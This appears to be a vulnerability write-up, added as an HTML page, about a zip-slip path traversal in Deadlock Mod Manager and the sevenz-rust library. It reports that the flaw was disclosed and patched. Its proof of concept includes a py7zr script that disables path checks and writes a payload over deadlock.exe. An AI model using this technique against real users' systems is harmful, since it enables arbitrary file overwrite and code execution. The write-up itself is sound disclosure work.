@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="../assets/css/style.css">
+        <meta name="theme-color" content="#151515">
+        <meta name="msapplication-navbutton-color" content="#151515">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+        <style>
+            /* This creates the colored box effect */
+            body {
+                background-color: #0d0d0d; /* Dark page background */
+                margin: 0;
+                padding: 20px;
+                font-family: 'Courier New', Courier, monospace;
+            }
+
+            .container {
+                background-color: #1e1e1e;
+                color: #f376ff;
+                max-width: 900px;
+                margin: 0 auto;
+                padding: 40px;
+            }
+
+            /* Optional: Styling the links to match a terminal theme */
+            a {
+                color: #4affff;
+                text-decoration: none;
+            }
+            a:hover {
+                text-decoration: underline;
+            }
+
+            blockquote {
+                background: #252525;
+                padding: 15px;
+                border-left: 5px solid #4affff;
+                margin: 20px 0;
+            }
+
+            img {
+                max-width: 100%;
+                height: auto;
+                border: 1px solid #444;
+                margin: 15px 0;
+            }
+
+            /* Bright pink page title and the bar beneath it */
+            .terminal-header {
+                border-bottom-color: #f01dc8;
+            }
+            .terminal-header .prompt {
+                color: #f01dc8;
+            }
+            .container {
+                padding-bottom: 24px;
+            }
+            #main_content {
+                margin-bottom: 0;
+            }
+            #main_content > .prompt-container:last-child h3 {
+                margin: 0;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <header class="terminal-header" id="top">
+                <div class="prompt-container">
+                    <span class="prompt">Seven Does a Zip Slip - RCE in Deadlock Mod Manager</span>
+                </div>
+            </header>
+            <section id="main_content">
+                <h1>Introduction</h1>
+                <p>Recently my friends got me hopelessly addicted to Valve's latest hit of digital heroin called Deadlock. One of the first things they showed me was Deadlock Mod Manager (which will be referred to as DLMM). They showed me mods that made their games into Gordon Freeman shooting at Po and Jacket. The only mod I ever downloaded was the one that turns all the character icons into cats, but I still often browse through its mod store to see what people have made. </p>
+                <p>Modding has always had a fraught relationship with security as mods often boil down to code that you run from unknown sources, but I was curious if it was possible to attack the mod manager itself. For a bad actor to take control of a computer via the mod manager, but  without having to run a mod. </p>
+                <hr>
+                <h1>The Loading </h1>
+                <p>The code for the mod manager backend is in <code>apps/desktop/src-tauri/src/mod_manager</code>.</p>
+                <p>I wanted to investigate the mod extraction logic as that is when the manager first interacts with a mod with on disk, but before the mod is actually ran; at which point the user has agreed to run the harmful code the mod could have (always check the mods you download kids). </p>
+                <p>The extraction code lies in <code>archive_extractor.rs::extract_archive</code>. The function matches the archive formats zip, rar, and 7z and calls a sub-extraction function to handle them.</p>
+                <pre><code>    match archive_path.extension().and_then(|e| e.to_str()) {
+      Some("zip") =&gt; self.extract_zip(archive_path, output_dir),
+      Some("rar") =&gt; self.extract_rar(archive_path, output_dir),
+      Some("7z") =&gt; self.extract_7z(archive_path, output_dir),
+      Some(ext) =&gt; Err(Error::ModExtractionFailed(format!(
+        "Unsupported archive format: {ext}"
+      ))),
+      None =&gt; Err(Error::ModExtractionFailed(
+        "Could not determine archive format".to_string(),
+      )),
+    }?;</code></pre>
+                <hr>
+                <h1>Primer on archives</h1>
+                <p>The specifics depends from format to format, but archives boil down to a list of compressed data and the paths to they get written to. These paths are relative within the extraction directory (e.g. <code>./homework/essayfinal.docx</code> gets extracted to <code>extraction_folder/homework/essayfinal.docx</code>). It is up to the archive extractor to verify that those paths aren't pointing outside the extraction directory (e.g. <code>../evil.exe</code> or <code>C:\Temp\hidden.txt</code>).</p>
+                <hr>
+                <h1>extract_7z</h1>
+                <p>The sub-extraction functions iterate through each file individually and checks if the file path is inside the the extraction directly. The exception is <code>extract_7z</code>, as the library they used to extract 7z archives, <code>sevenz-rust</code>, is unable to process files singularly. To work around this limitation, DLMM says they "validate that the output directory is properly sandboxed by the calling code before extraction."</p>
+                <pre><code>sevenz_rust::decompress_file(
+  archive_path.to_string_lossy().as_ref(),
+  output_dir.to_string_lossy().as_ref(),
+)
+.map_err(|e| Error::ModExtractionFailed(e.to_string()))?;
+
+// After extraction, validate that no files were extracted outside the target directory
+self.validate_extracted_files(output_dir)?;</code></pre>
+                <p>Huh, it looks like they validated <i>after</i> extracting the archive. If we were to escape the extraction directory, our files would be written to disk before the program could validate. But it is still worth checking the validation function as they might still catch us and warn the user.</p>
+                <pre><code>/// Validate that all extracted files are within the expected output directory
+  fn validate_extracted_files(&amp;self, output_dir: &amp;Path) -&gt; Result&lt;(), Error&gt; {
+    let canonical_output = output_dir
+      .canonicalize()
+      .map_err(|_| Error::UnauthorizedPath("Unable to resolve output directory".to_string()))?;
+
+    self.validate_directory_recursive(output_dir, &amp;canonical_output)?;
+    Ok(())
+  }</code></pre>
+                <p>They check if any files were extracted outside the target directory by recursively checking files... in the target directory. Effectively pointless.</p>
+                <p> We now know that there is no efficacious validation for 7z archives by DLMM, but it doesn't matter if we can't escape the extraction directory from the <code>sevenz_rust::decompress_file</code> call.</p>
+                <hr>
+                <h1>sevenz-rust</h1>
+                <p>Searching online for vulnerabilities gave nothing for <code>sevenz-rust</code> directly, but there was a <a href="https://intel.aikido.dev/cve/AIKIDO-2026-428616">zip slip vulnerability posting</a> for <code>sevenz-rust2</code>. <code>sevenz-rust2</code> was a library made by some contributors after <code>sevenz-rust</code> got abandoned. I had a hunch that <code>sevenz-rust</code>might have the same or similar zip slip vuln, as something of that magnitude would likely be a carry over from the original library rather than something being introduced in a new version.</p>
+                <p>Looking at the source code of <code>sevenz-rust</code>, we can see that the logic pertaining to extraction is in <code>de_funcs.rs::decompress_impl</code>.</p>
+                <p>We can see that the extraction loop inside the function blindly joins the two paths together and passes it into <code>extract_fn</code>. <code>extract_fn</code> is a supplied argument from <code>decompress_impl</code> and defaults to <code>default_entry_extract_fn</code>.</p>
+                <pre><code>seven.for_each_entries(|entry, reader| {
+	let dest_path = dest.join(entry.name());
+	extract_fn(entry, reader, &amp;dest_path)
+})?;</code></pre>
+                <p>And looking at <code>default_entry_extract_fn</code>, we can see that there is no validation to prevent zip slips here either before it creates the file to write to.</p>
+                <pre><code>pub fn default_entry_extract_fn(
+    entry: &amp;SevenZArchiveEntry,
+    reader: &amp;mut dyn Read,
+    dest: &amp;PathBuf,
+) -&gt; Result&lt;bool, Error&gt; {
+    use std::{fs::File, io::BufWriter};
+
+    if entry.is_directory() {
+        let dir = dest;
+        if !dir.exists() {
+            std::fs::create_dir_all(dir).map_err(Error::io)?;
+        }
+    } else {
+        let path = dest;
+        path.parent().and_then(|p| {
+            if !p.exists() {
+                std::fs::create_dir_all(p).ok()
+            } else {
+                None
+            }
+        });
+        let file = File::create(path)
+        ...</code></pre>
+                <hr>
+                <h1>The Attack</h1>
+                <p>Since DLMM doesn't properly validate extraction paths and <code>sevenz-rust</code> doesn't validate at all, we now have the ability to extract a file anywhere outside of the extraction directory, an arbitrary file write. From here there are many ways to escalate this into remote command execution, such as writing a program into the windows start menu folder, but a fun one to do would be replacing Deadlock itself. </p>
+                <p>Archive software like 7zip won't allow us to make a 7z archive with a zip slip in it, so we will have to construct it ourselves. For the PoC, we will make a fake Mina skin to prank a person who mods their game to have all the women remodeled <i>for some reason</i>.</p>
+                <p>Our mod will have two files in it:  </p>
+                <p><code>payload.exe</code>: A malicious program that we will replace Deadlock with. For this example we will make it simply open calculator.</p>
+                <pre><code>fn main() {
+    std::process::Command::new("calc.exe").spawn();
+}</code></pre>
+                <p>And <code>test.vpk</code>: Any valid vpk that will load into the game. This is not necessary for the zip slip to occur but it prevents any miscellaneous errors that would arouse user suspiscion.  </p>
+                <p>We can create the mod archive manually using this python script.</p>
+                <pre><code>import py7zr
+import io
+py7zr.py7zr.check_archive_path = lambda path: True
+with py7zr.SevenZipFile('minaHaSkin.7z', 'w') as archive:
+    archive.writef(io.BytesIO(open('./calc_payload.exe', 'rb').read()),
+        # The zip slip works with both relative and absolute paths, using absolute for simplicity
+        "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Deadlock\\game\\bin\\win64\\deadlock.exe")
+    archive.write("./test.vpk", arcname="test.vpk")</code></pre>
+                <p>Loading our mod locally into DLMM and launch the game we can see that instead of the game, it opens up the Calculator, even though we launched the game specifically without mods.</p>
+                <p><a href="https://github.com/user-attachments/assets/c45e7b8d-20e5-4a94-9911-de3eec29fa6e">https://github.com/user-attachments/assets/c45e7b8d-20e5-4a94-9911-de3eec29fa6e</a></p>
+                <hr>
+                <h1>Conclusion</h1>
+                <p> The vulnerability has been reported to DLMM and has been patched for version 2.0.0. The path traversal in <code>sevenz-rust</code> has been reported to RustSec and has been given the advisory <a href="https://rustsec.org/advisories/RUSTSEC-2026-0245.html">RUSTSEC-2026-0245</a></p>
+                <p>The thing that stuck out to me during this process was how the DLMM team clearly anticipated this happened and tried to put in measures, but those measures were completely paradoxical. The docstring saying that the validation was done before extraction placed directly next to a comment saying the validation was after, and the validation checking for extractions outside a folder by only checking said folder. The most probable explanation would be that this section was vibe coded and wasn't properly reviewed. This is my hesitation about vibe coding, not that the generated code won't work, but because it tempts the viber not to fully understand said code because it "works" and then potentially letting dangerous things caused by the AI slip by.</p>
+                <p>But this exploit was only possible because of a vulnerable library made before AI, so maybe we shouldn't trust the humans with coding either.</p>
+                <hr>
+                <p style="text-align: center;"><i>Does path traversal count as apotheosis?</i></p>
+                <div class="prompt-container">
+                    <span class="prompt"><h3> <a href="#top">Back to top</a></h3></span>
+                </div>
+            </section>
+        </div>
+    </body>
+</html>
